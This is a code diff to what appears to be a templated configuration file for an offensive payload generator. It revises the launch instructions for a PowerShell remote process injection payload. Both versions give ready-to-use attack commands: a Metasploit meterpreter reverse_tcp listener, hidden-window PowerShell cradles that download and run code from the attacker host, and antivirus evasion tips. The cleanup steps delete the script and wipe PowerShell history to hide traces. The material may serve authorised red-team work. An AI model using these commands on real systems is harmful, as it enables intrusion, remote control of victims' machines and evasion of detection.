@@ -87,77 +87,35 @@ output:
   launch_instructions: |
     PowerShell Remote Process Injection - Launch Instructions
 
-    Step 1: Start Metasploit Listener
-
-    Start msfconsole and configure the handler:
-
+    Start Listener:
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Or manually in msfconsole:
+    Transfer and Execute (In-Memory):
+    powershell -ep bypass -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/{{ output_file }}')"
 
-    use exploit/multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST {{ lhost }}
-    set LPORT {{ lport }}
-    set ExitOnSession false
-    exploit -j
-
-    Step 2: Transfer Script to Target
-
-    Transfer the generated PowerShell script to the target Windows system:
-
-    Using Python HTTP server:
+    Alternative (File-Based):
     python3 -m http.server 8080
-
-    On target (PowerShell):
-    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
-
-    Step 3: Execute on Target
-
-    Run the PowerShell script with execution policy bypass:
-
-    powershell.exe -ExecutionPolicy Bypass -File {{ output_file }}
-
-    Or use dot-sourcing:
-    powershell.exe -ExecutionPolicy Bypass -Command ". .\{{ output_file }}"
-
-    Or download and execute in memory (fileless):
-    powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/{{ output_file }}')"
-
-    Step 4: Verify Connection
-
-    Check your Metasploit console for incoming session:
-    Sending stage (200262 bytes) to [target_ip]
-    Meterpreter session 1 opened
+    On target: powershell -ep bypass -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; .\{{ output_file }}"
 
     Notes:
-
-    - Target process: {{ target_process }} (must be running on target system)
-    - Uses reflection to dynamically resolve Windows API functions
-    - No static P/Invoke signatures (helps evade some AV)
-    - EXITFUNC=thread ensures clean exit without crashing target process
-    - PowerShell execution may be logged by Windows Event Logs
-    - Consider obfuscating the script for additional evasion
+    - Target process: {{ target_process }} (must be running on target)
+    - Uses reflection to dynamically resolve Windows APIs (VirtualAllocEx, WriteProcessMemory, CreateRemoteThread)
+    - No static P/Invoke signatures (evades some AV)
+    - EXITFUNC=thread ensures clean exit without crashing {{ target_process }}
+    - Injects into existing process (not spawning new process)
+    - Requires matching architecture (x64 payload → x64 process)
+    - May require administrative privileges depending on target process integrity level
+    - PowerShell Script Block Logging will record execution (Event ID 4104)
 
     Troubleshooting:
-
-    - If injection fails: Verify target process is running: Get-Process {{ target_process }}
-    - If process not found: Try different target (notepad, chrome, etc.)
-    - If no connection: Check firewall rules on attacker machine
-    - If AV blocks: Consider script obfuscation or encoding
-    - Requires matching architecture (x64 payload for x64 process)
-    - May need administrative privileges depending on target process
-
-    Alternative Execution Methods:
-
-    Encoded command (helps bypass simple AV):
-    $encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes((Get-Content {{ output_file }} -Raw)))
-    powershell.exe -EncodedCommand $encoded
+    - Injection fails: Verify target process running with Get-Process {{ target_process }}
+    - Process not found: Try alternative targets (notepad, explorer, chrome, msedge)
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - AV blocks: Obfuscate script with Invoke-Obfuscation or encode with -EncodedCommand
+    - Access Denied: Target process may be protected (PPL) or running at higher integrity level
+    - Sysmon Event ID 8 (CreateRemoteThread) will fire on injection
 
     Cleanup:
-
-    After testing, remove the script:
-    Remove-Item {{ output_file }} -Force
-
-    Clear PowerShell history:
-    Remove-Item (Get-PSReadlineOption).HistorySavePath
+    On target:
+    Remove-Item {{ output_file }} -Force -ErrorAction SilentlyContinue
+    Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
